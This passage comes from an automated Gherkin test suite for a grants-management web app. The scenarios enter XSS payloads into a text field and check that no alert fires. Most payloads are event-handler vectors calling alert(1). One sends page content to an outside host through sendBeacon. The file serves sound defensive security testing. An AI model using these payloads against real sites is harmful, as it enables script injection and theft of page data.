    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                              | Field                |
      | <input oninput=alert(1) value=xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300836 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                        | Field                |
      | <form><input oninvalid=alert(1) required><input type=submit> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300837 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                    | Field                |
      | <xss onkeydown="alert(1)" contenteditable style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300838 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                     | Field                |
      | <xss onkeypress="alert(1)" contenteditable style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300839 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                  | Field                |
      | <xss onkeyup="alert(1)" contenteditable style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300840 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onmousedown="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300841 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <xss onmouseenter="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300842 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                       | Field                |
      | <xss onmouseleave="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300843 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onmousemove="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300844 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                     | Field                |
      | <xss onmouseout="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300845 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      | <xss onmouseover="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300846 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                    | Field                |
      | <xss onmouseup="alert(1)" style=display:block>test</xss> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300847 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                             | Field                |
      | <xss onmousewheel=alert(1) style=display:block>requires scrolling | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300848 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                              | Field                |
      | <video onmozfullscreenchange=alert(1) src=validvideo.mp4 controls> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300849 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                 | Field                |
      | <body onpagehide=navigator.sendBeacon('//https://ssl.portswigger-labs.net/',document.body.innerHTML)> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300850 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                          | Field                |
      | <a onpaste="alert(1)" contenteditable>test</a> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300851 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                            | Field                |
      | <audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio> | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300852 
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6823                   | PBD-17265                  |
    When I login to "As a Grantor" app as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    When I perform quick search for "Automation Internal Program for Testing"
    And I click on "fa fa-pencil" icon in flex table for first draft record
    When I enter values into fields
